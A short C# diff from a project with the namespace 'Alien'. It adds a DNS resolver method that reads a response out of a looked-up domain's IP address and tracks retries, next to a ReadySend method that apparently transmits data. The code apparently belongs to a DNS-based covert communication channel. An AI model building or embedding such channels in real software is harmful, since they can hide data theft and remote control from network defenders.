@@ -27,6 +27,25 @@ namespace Alien
 			}
 		}
 
+		private static bool _Resolver(out byte[] response)
+		{
+			bool result = true;
+			response = null;
+			try
+			{
+				Util.Log(DnsClass._Domain);
+				IPHostEntry iphostEntry = Dns.Resolve(DnsClass._Domain);
+				response = iphostEntry.AddressList[0].GetAddressBytes();
+				DnsClass._Try = 0;
+				Config.IncreaseCounter();
+			}
+			catch
+			{
+				DnsClass._Try++;
+				result = false;
+			}
+			return result;
+		}
 
 		public static void ReadySend(byte[] sendData)
 		{
